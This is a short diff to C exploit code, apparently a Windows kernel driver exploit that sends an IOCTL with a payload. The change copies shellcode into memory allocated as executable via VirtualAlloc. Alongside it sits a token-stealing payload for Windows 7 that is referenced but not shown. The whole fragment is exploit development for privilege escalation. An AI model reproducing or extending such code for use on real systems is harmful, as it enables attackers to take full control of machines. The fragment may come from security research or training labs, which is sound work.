@@ -40,7 +40,9 @@ BOOL send_ioctl(HANDLE device, DWORD ioctl_code)
     payload_ptr = &TokenStealingPayloadWin7;
 #else
     printf("Using shellcode payload\n");
-    payload_ptr = kShellcode;
+    payload_ptr = VirtualAlloc(0, sizeof(kShellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (payload_ptr)
+        memcpy(payload_ptr, kShellcode, sizeof(kShellcode));
 #endif
     if (payload_ptr == NULL) {
         printf("[-] Payload cannot be NULL\n");
